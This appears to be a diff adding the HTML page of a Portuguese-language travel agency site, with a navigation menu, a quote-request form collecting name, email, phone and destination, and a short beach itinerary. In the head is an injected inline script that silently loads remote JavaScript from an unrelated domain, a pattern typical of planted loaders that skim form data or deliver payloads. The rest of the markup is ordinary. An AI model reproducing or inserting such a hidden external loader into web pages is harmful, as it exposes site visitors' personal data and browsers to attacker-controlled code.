@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Roteiro de Viagem</title>
+    <link rel="stylesheet" href="style.css">
+    <script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NDY5NjI1.js?t=469625';
+      document.head.appendChild(script);
+  })();
+</script>
+</head>
+<body>
+    
+<!-- Menu de Navegação -->
+    <header>
+  <nav class="navbar">
+    <h1 class="logo">Viaje Sereno</h1>
+    <button class="menu-toggle" id="menuToggle">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#">Início</a></li>
+      <li><a href="#">Roteiros</a></li>
+      <li><a href="#">Blog</a></li>
+      <li><a href="#">Contato</a></li>
+    </ul>
+  </nav>
+</header>
+
+<section class="banner">
+  <div class="banner-content">
+    <h1>Viaje Sereno</h1>
+    <p>Descubra destinos encantadores com quem entende de experiências únicas</p>
+    <a href="#formOrcamento" class="btn-banner">Solicitar orçamento</a>
+  </div>
+</section>
+
+<section id="orcamento">
+  <form id="formOrcamento">
+    <h2>Solicite um Orçamento</h2>
+
+    <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required>
+    <input type="email" id="email" name="email" placeholder="Digite seu e-mail" required>
+    <input type="tel" id="telefone" name="telefone" placeholder="(XX) XXXXX-XXXX" required>
+    <input type="text" id="destino" name="destino" placeholder="Destino desejado" required>
+    <textarea id="mensagem" name="mensagem" placeholder="Escreva detalhes da sua viagem" rows="4"></textarea>
+
+    <button type="submit" id="btnEnviar">
+      <span id="btnTexto">Enviar Solicitação</span>
+      <span id="loading" style="display:none;">⏳ Enviando...</span>
+    </button>
+
+    <!-- Mensagens -->
+    <p id="mensagemSucesso">✅ Obrigado! Sua solicitação foi enviada com sucesso.</p>
+    <p id="mensagemErro">❌ Ocorreu um erro ao enviar. Tente novamente mais tarde.</p>
+  </form>
+</section>
+
+
+    <!-- Conteúdo já existente -->
+    <h1>Minha Agência de Viagens</h1>
+    <button id="botaoRoteiro">Mostrar Roteiro</button>
+
+    <div id="roteiro" style="display: none;">
+        <h2>Roteiro de Porto de Galinhas</h2>
+        <p>Dia 1: Chegada e check-in no hotel</p>
+        <p>Dia 2: Passeio de buggy e praias</p>
+        <p>Dia 3: Mergulho e despedida</p>
+    </div>
+
+   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+ <script src="script.js"></script>
+</body>
+</html>
